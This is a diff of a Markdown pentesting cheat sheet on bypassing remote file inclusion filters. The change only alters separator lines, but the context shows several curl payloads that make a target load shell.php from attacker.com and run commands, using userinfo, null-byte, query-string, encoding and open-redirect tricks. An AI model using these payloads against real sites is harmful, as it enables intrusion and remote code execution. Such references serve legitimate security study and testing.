@@ -16,7 +16,7 @@ linked:
 ---
 # RFI - Bypass de Filtros
 
-***
+---
 
 ## Whitelist Domain Bypass
 
@@ -39,7 +39,7 @@ linked:
 | `curl 'https://target/?page=http://attacker.com:80@target.com/shell.php&c=id'` | Port + userinfo confusion | Port + userinfo. |
 ^rfi-bypass-whitelist
 
-___
+---
 
 ## Null Byte Truncation
 
@@ -57,7 +57,7 @@ ___
 | `python3 -c "import urllib.parse; print(urllib.parse.quote(chr(0)))"` (generate %00) | DIY NUL encoder | DIY helper. |
 ^rfi-bypass-nullbyte
 
-___
+---
 
 ## Query String Trick (`?page=...?`)
 
@@ -75,7 +75,7 @@ ___
 | `curl 'https://target/?page=http://attacker.com/shell.php%23%3F&c=id'` | Encoded `#?` reverse order | Edge order. |
 ^rfi-bypass-query
 
-___
+---
 
 ## URL Encoding
 
@@ -95,7 +95,7 @@ ___
 | `curl 'https://target/?page=http%3a//attacker.com/shell.php&c=id'` (mixed encoding `%3a` lowercase) | Partial mixed encoding | Mixed encode. |
 ^rfi-bypass-encoding
 
-___
+---
 
 ## Open Redirect Chain
 
@@ -115,4 +115,4 @@ ___
 | `curl 'https://target/?page=https://login.target.com/oauth/authorize?redirect_uri=http://attacker.com/shell.php&c=id'` | OAuth redirect_uri leak chain | OAuth combo. |
 ^rfi-bypass-open-redirect
 
-***
+---
